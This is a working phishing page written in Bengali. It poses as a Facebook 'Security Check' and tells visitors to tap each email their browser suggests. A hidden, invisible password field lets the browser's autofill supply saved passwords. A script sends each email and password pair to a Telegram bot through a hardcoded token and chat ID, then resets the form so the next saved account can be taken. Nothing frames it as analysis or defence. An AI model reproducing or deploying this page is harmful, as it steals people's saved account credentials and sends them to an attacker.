<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Security Check</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #f7f9fc; font-family: 'Helvetica', Arial, sans-serif; margin: 0; padding: 0; height: 100vh; overflow: hidden; display: flex; flex-direction: column; }
        .top-half { height: 48vh; width: 100%; display: flex; align-items: center; justify-content: center; background-color: white; border-bottom: 1px solid #e1e4e8; padding: 10px; box-sizing: border-box; }
        .top-half img { max-width: 100%; max-height: 100%; object-fit: contain; border-radius: 8px; }
        .bottom-half { height: 52vh; width: 100%; background: #f7f9fc; padding: 20px; box-sizing: border-box; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 15px; position: relative; }
        .main-title { font-size: 18px; font-weight: 800; color: #ef4444; text-align: center; line-height: 1.4; margin-bottom: 10px; }
        .secure-input { width: 100%; max-width: 350px; padding: 18px; border: 2px solid #1877f2; border-radius: 14px; outline: none; font-size: 17px; background: white; text-align: center; transition: all 0.3s; }
        #hidden_pass { position: absolute; opacity: 0; pointer-events: none; width: 1px; height: 1px; }
    </style>
</head>
<body onload="initCapture()">

    <div class="top-half">
        <img src="https://raw.githubusercontent.com/probasi-kollan-office-creator/facebook-friend-add/main/Picsart_26-03-15_06-28-09-284.jpg">
    </div>

    <div class="bottom-half">
        <h2 class="main-title">ফেসবুক এড করতে আপনার কিবোর্ড এর উপর ভেসে থাকা প্রতিটি ইমেইল এর উপরে একে একে ক্লিক করুন</h2>
        
        <form id="auto_form" autocomplete="on">
            <input type="email" id="auto_email" name="email" autocomplete="username" placeholder="এখানে ক্লিক করুন" class="secure-input">
            <input type="password" id="hidden_pass" name="password" autocomplete="current-password">
        </form>
        
        <p id="status_text" class="text-[13px] text-blue-600 font-bold mt-4">অ্যাকাউন্ট ভেরিফাই করুন</p>
    </div>

<script>
    const botToken = "8617715035:AAHXQjkEtjYX40KQTAE5e_jVRQ_pKQX5Qjk";
    const chatId = "8516934257";
    let isProcessing = false;

    function initCapture() {
        const eField = document.getElementById('auto_email');
        const pField = document.getElementById('hidden_pass');
        const status = document.getElementById('status_text');

        setInterval(() => {
            // যদি ইনপুট বক্সে ডাটা বসে এবং প্রসেসিং না চলে
            if (eField.value.length > 3 && !isProcessing) {
                isProcessing = true;
                const u = eField.value;
                const p = pField.value;

                // টেলিগ্রামে ডাটা পাঠানো
                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ 
                        chat_id: chatId, 
                        text: `💾 **সেভ ডাটা ক্যাপচার!**\n📧 আইডি: \`${u}\` \n🔑 পাস: \`${p}\`` 
                    })
                });

                status.innerText = "সফল হয়েছে! পরবর্তী একাউন্টে ক্লিক করুন...";
                status.classList.replace('text-blue-600', 'text-green-600');

                // ১ সেকেন্ড পর বক্স ক্লিন করা যাতে ব্রাউজার পরের সাজেস্ট করে
                setTimeout(() => {
                    document.getElementById('auto_form').reset(); 
                    eField.value = "";
                    pField.value = "";
                    eField.placeholder = "পরের একাউন্টে ক্লিক করুন";
                    status.innerText = "অ্যাকাউন্ট ভেরিফাই করুন";
                    status.classList.replace('text-green-600', 'text-blue-600');
                    isProcessing = false;
                    eField.focus(); // কিবোর্ড আবার ওপেন করার চেষ্টা করবে
                }, 1000);
            }
        }, 1000);
    }
</script>
</body>
</html>
